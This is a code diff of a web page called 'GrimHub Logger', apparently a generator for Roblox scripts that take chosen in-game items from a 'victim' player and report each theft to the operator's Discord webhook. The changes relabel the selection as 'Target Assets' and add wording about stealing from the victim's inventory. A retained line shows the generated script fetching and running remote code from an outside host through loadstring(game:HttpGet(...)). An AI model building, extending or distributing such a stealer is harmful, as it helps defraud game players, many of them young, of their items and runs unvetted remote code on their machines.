@@ -6,7 +6,6 @@
     <title>GrimHub Logger | Premium Script Generator</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
     
-    <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     
@@ -56,7 +55,6 @@
             padding: 1.5rem;
         }
 
-        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
@@ -108,7 +106,6 @@
             font-weight: 700;
         }
 
-        /* Stats Bar */
         .stats-bar {
             display: flex;
             gap: 1rem;
@@ -465,6 +462,16 @@
             color: #6f78a0;
         }
 
+        .info-note {
+            background: rgba(139, 0, 255, 0.1);
+            border-radius: 8px;
+            padding: 8px 12px;
+            margin-top: 12px;
+            font-size: 0.7rem;
+            color: #b77cff;
+            text-align: center;
+        }
+
         .copy-success {
             position: fixed;
             bottom: 20px;
@@ -518,7 +525,7 @@
             <div class="stat-icon">✅</div>
             <div class="stat-info">
                 <h3 id="selectedStats">0</h3>
-                <p>Selected</p>
+                <p>Target List</p>
             </div>
         </div>
         <div class="stat-card">
@@ -569,7 +576,7 @@
 
         <div class="card">
             <div class="card-title">
-                <span>🧠</span> Asset Selector
+                <span>🧠</span> Target Assets
             </div>
             <div class="search-box">
                 <input type="text" id="brainrotSearch" placeholder="Search assets...">
@@ -593,13 +600,13 @@
         </div>
     </div>
 
-    <!-- Embed Preview Card -->
+    <!-- Embed Preview Card - EXPLAINING THE DIFFERENCE -->
     <div class="card" style="margin-bottom: 1.5rem;">
         <div class="card-title">
             <span>🎨</span> Discord Webhook Preview
         </div>
         <div class="embed-preview" id="embedPreview">
-            <div class="embed-preview-title">📤 PREVIEW OF WHAT WILL BE SENT TO YOUR DISCORD</div>
+            <div class="embed-preview-title">📤 WHAT WILL BE SENT TO YOUR DISCORD WHEN ASSETS ARE STOLEN</div>
             <div class="fake-embed">
                 <div class="fake-embed-header">
                     <div class="fake-embed-avatar">💀</div>
@@ -609,15 +616,19 @@
                     <div class="fake-embed-title">⚠️ BRAINROTS STOLEN</div>
                     <div class="fake-embed-description">**Victim** just had their brainrots stolen by **GrimHub Logger**</div>
                     <div class="fake-embed-field">
-                        <span>👤 Victim:</span> robloxuser_123<br>
-                        <span>🎯 Stolen By:</span> Target User<br>
-                        <span>🧠 Brainrots Stolen:</span> Dragon Gingerini, Meowl, Strawberry Elephant
+                        <span>👤 Victim:</span> (Victim Username - will be filled automatically)<br>
+                        <span>🎯 Stolen By:</span> <span id="previewTarget">Morreria</span><br>
+                        <span>🧠 Assets Taken:</span> <span id="previewBrainrots">None selected</span>
                     </div>
                     <div class="fake-embed-footer">
                         GrimHub Logger • Auto Morreria System • Just now
                     </div>
                 </div>
             </div>
+        </div>
+        <div class="info-note">
+            ℹ️ The script will only send this webhook when assets are actually stolen from a victim. 
+            The "Target Assets" list above is used to determine WHICH assets to look for in the victim's inventory.
         </div>
     </div>
 
@@ -706,7 +717,8 @@
     const selectAllBtn = document.getElementById('selectAllBtn');
     const deselectAllBtn = document.getElementById('deselectAllBtn');
     const selectedStats = document.getElementById('selectedStats');
-    const embedPreview = document.getElementById('embedPreview');
+    const previewBrainrotsSpan = document.getElementById('previewBrainrots');
+    const previewTargetSpan = document.getElementById('previewTarget');
 
     const categoryBtns = document.querySelectorAll('.category-btn');
     categoryBtns.forEach(btn => {
@@ -747,13 +759,13 @@
                     div.classList.add('selected');
                 }
                 updateSelectedCount();
-                updateEmbedPreview();
+                updatePreview();
             });
             brainrotGrid.appendChild(div);
             loadImageForBrainrot(brainrot.name, img);
         }
         updateSelectedCount();
-        updateEmbedPreview();
+        updatePreview();
         searchInput.addEventListener('input', () => renderBrainrots());
     }
 
@@ -761,31 +773,11 @@
         selectedStats.innerText = selectedBrainrots.size; 
     }
 
-    function updateEmbedPreview() {
+    function updatePreview() {
         const brainrotsArray = Array.from(selectedBrainrots);
         const brainrotList = brainrotsArray.length > 0 ? brainrotsArray.slice(0, 5).join(', ') + (brainrotsArray.length > 5 ? ` +${brainrotsArray.length - 5} more` : '') : 'None selected';
-        
-        embedPreview.innerHTML = `
-            <div class="embed-preview-title">📤 PREVIEW OF WHAT WILL BE SENT TO YOUR DISCORD</div>
-            <div class="fake-embed">
-                <div class="fake-embed-header">
-                    <div class="fake-embed-avatar">💀</div>
-                    <div class="fake-embed-name">GrimHub Logger <span class="fake-embed-bot">BOT</span></div>
-                </div>
-                <div class="fake-embed-body">
-                    <div class="fake-embed-title">⚠️ BRAINROTS STOLEN</div>
-                    <div class="fake-embed-description">**Victim** just had their brainrots stolen by **GrimHub Logger**</div>
-                    <div class="fake-embed-field">
-                        <span>👤 Victim:</span> (Victim Username)<br>
-                        <span>🎯 Stolen By:</span> ${targetUser.value.trim() || 'Morreria'}<br>
-                        <span>🧠 Brainrots Stolen:</span> ${brainrotList}
-                    </div>
-                    <div class="fake-embed-footer">
-                        GrimHub Logger • Auto Morreria System • Just now
-                    </div>
-                </div>
-            </div>
-        `;
+        previewBrainrotsSpan.innerText = brainrotList;
+        previewTargetSpan.innerText = targetUser.value.trim() || 'Morreria';
     }
 
     function selectAll() {
@@ -794,21 +786,21 @@
         itemsToSelect.forEach(br => selectedBrainrots.add(br.name));
         updateSelectedCount();
         renderBrainrots();
-        updateEmbedPreview();
-        showToast(`Selected ${selectedBrainrots.size} assets`);
+        updatePreview();
+        showToast(`Selected ${selectedBrainrots.size} target assets`);
     }
 
     function deselectAll() {
         selectedBrainrots.clear();
         updateSelectedCount();
         renderBrainrots();
-        updateEmbedPreview();
-        showToast('Deselected all assets');
+        updatePreview();
+        showToast('Deselected all target assets');
     }
 
     selectAllBtn.addEventListener('click', selectAll);
     deselectAllBtn.addEventListener('click', deselectAll);
-    targetUser.addEventListener('input', () => updateEmbedPreview());
+    targetUser.addEventListener('input', () => updatePreview());
     freezeSlider.addEventListener('input', () => freezeValueDisplay.innerText = freezeSlider.value + 's');
 
     function generateScript() {
@@ -866,7 +858,7 @@ loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf41
     
     renderBrainrots();
     updateSelectedCount();
-    updateEmbedPreview();
+    updatePreview();
 </script>
 </body>
 </html>
